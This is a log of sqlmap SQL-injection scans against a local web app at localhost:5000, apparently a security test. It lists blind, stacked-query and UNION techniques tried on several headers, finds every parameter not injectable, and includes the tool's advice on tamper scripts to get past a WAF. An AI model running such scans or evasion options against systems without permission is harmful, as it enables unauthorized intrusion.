INFO - [20:19:59] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:19:59] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:19:59] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:19:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:19:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:19:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:19:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:19:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:19:59] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:19:59] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:19:59] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:00] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:00] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:00] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:00] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:20:00] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:20:00] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:20:00] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:20:01] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:20:01] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:20:01] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:20:02] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:20:02] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:20:03] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:20:03] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:20:04] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:20:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:20:05] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:20:05] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:20:05] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:20:06] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
INFO - [20:20:06] [INFO] testing if parameter 'User-Agent' is dynamic
INFO - [20:20:06] [WARNING] parameter 'User-Agent' does not appear to be dynamic
INFO - [20:20:06] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
INFO - [20:20:06] [INFO] testing for SQL injection on parameter 'User-Agent'
INFO - [20:20:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:20:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:20:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:20:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:20:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:20:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:20:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:20:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:20:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:20:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:20:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:20:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:20:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:20:11] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:20:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:20:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:20:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:20:13] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:20:14] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:20:14] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:20:15] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:20:15] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:20:15] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:20:16] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:20:16] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:20:17] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:20:17] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:20:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:20:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:20:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:20:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:20:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:20:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:20:17] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:20:17] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:20:17] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:20:17] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:20:17] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:20:17] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:20:17] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:20:17] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:20:17] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:20:17] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:20:17] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:20:17] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:20:17] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:20:17] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:20:18] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:20:18] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:20:18] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:18] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:18] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:18] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:18] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:18] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:20:18] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:20:18] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:20:18] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:20:18] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:18] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:18] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:18] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:18] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:18] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:18] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:20:18] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:20:18] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:20:18] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:20:18] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:20:18] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:20:19] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:20:19] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:20:19] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:20:19] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:20:20] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:20:20] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:20:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:20:21] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:20:21] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:20:22] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:20:22] [WARNING] parameter 'User-Agent' does not seem to be injectable
INFO - [20:20:22] [INFO] testing if parameter 'Referer' is dynamic
INFO - [20:20:22] [WARNING] parameter 'Referer' does not appear to be dynamic
INFO - [20:20:22] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
INFO - [20:20:22] [INFO] testing for SQL injection on parameter 'Referer'
INFO - [20:20:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:20:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:20:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:20:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:20:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:20:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:20:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:20:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:20:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:20:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:20:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:20:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:20:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:20:27] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:20:27] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:20:27] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:20:28] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:20:28] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:20:29] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:20:29] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:20:30] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:20:30] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:20:31] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:20:31] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:20:31] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:20:32] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:20:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:20:32] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:20:32] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:20:32] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:20:32] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:20:33] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:20:33] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:20:33] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:20:33] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:20:33] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:20:33] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:20:33] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:20:33] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:20:33] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:20:33] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:20:33] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:20:33] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:20:33] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:20:33] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:20:33] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:20:33] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:20:33] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:20:33] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:20:33] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:33] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:33] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:33] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:33] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:33] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:20:33] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:20:33] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:20:33] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:20:33] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:33] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:33] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:33] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:33] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:33] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:33] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:20:33] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:20:33] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:20:33] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:20:34] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:20:34] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:20:34] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:20:34] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:20:34] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:20:35] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:20:35] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:20:35] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:20:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:20:36] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:20:37] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:20:37] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:20:38] [WARNING] parameter 'Referer' does not seem to be injectable
INFO - [20:20:38] [INFO] testing if parameter 'Host' is dynamic
INFO - [20:20:38] [WARNING] parameter 'Host' does not appear to be dynamic
INFO - [20:20:38] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
INFO - [20:20:38] [INFO] testing for SQL injection on parameter 'Host'
INFO - [20:20:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:20:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:20:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:20:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:20:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:20:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:20:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:20:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:20:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:20:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:20:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:20:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:20:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:20:42] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:20:43] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:20:43] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:20:44] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:20:44] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:20:45] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:20:46] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:20:47] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:20:48] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:20:49] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:20:49] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:20:51] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:20:51] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:20:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:20:52] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:20:52] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:20:52] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:20:52] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:20:52] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:20:52] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:20:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:20:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:20:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:20:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:20:52] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:20:52] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:20:52] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:20:52] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:20:52] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:20:52] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:20:52] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:20:52] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:20:52] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:20:52] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:20:52] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:20:52] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:20:52] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:52] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:52] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:52] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:52] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:52] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:20:52] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:20:52] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:20:52] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:20:52] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:52] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:52] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:52] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:52] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:20:52] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:20:52] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:20:52] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:20:52] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:20:53] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:20:53] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:20:53] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:20:53] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:20:54] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:20:54] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:20:54] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:20:54] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:20:54] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:20:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:20:55] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:20:56] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:20:57] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:20:57] [WARNING] parameter 'Host' does not seem to be injectable
INFO - [20:20:57] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:20:57] [WARNING] HTTP error codes detected during run:
INFO - 405 (Method Not Allowed) - 5159 times, 404 (Not Found) - 2360 times
INFO - [*] ending @ 20:20:57 /2025-09-26/
INFO - No clear injection detected during discovery for http://localhost:5000/pickle
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/proxy
INFO -        __H__
